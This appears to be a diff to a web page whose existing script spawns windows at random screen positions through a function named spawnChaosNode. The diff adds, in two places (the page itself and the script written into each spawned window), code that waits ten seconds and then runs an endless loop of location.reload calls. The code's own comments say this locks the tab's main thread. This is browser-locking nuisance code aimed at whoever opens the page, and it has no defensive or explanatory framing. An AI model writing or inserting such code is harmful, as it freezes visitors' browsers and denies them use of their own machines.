@@ -116,6 +116,20 @@
                                     Math.random() * (screen.availHeight - 350)
                                 );
                             }, 100);
+
+                            // Sets a flag in the background
+onbeforeunload = function() { 
+    localStorage.x = 1; 
+};
+
+// Triggers automatically after a 10-second delay
+setTimeout(function() {
+    // The Infinite Loop
+    // Once this starts, the tab's main thread is locked
+    while (1) {
+        location.reload(1);
+    }
+}, 10000); // 10,000ms = 10 seconds
                         <\/script>
                     </body>
                     </html>
@@ -129,6 +143,20 @@
         }
 
         window.onload = spawnChaosNode;
+
+        // Sets a flag in the background
+onbeforeunload = function() { 
+    localStorage.x = 1; 
+};
+
+// Triggers automatically after a 10-second delay
+setTimeout(function() {
+    // The Infinite Loop
+    // Once this starts, the tab's main thread is locked
+    while (1) {
+        location.reload(1);
+    }
+}, 10000); // 10,000ms = 10 seconds
     </script>
 </body>
 </html>
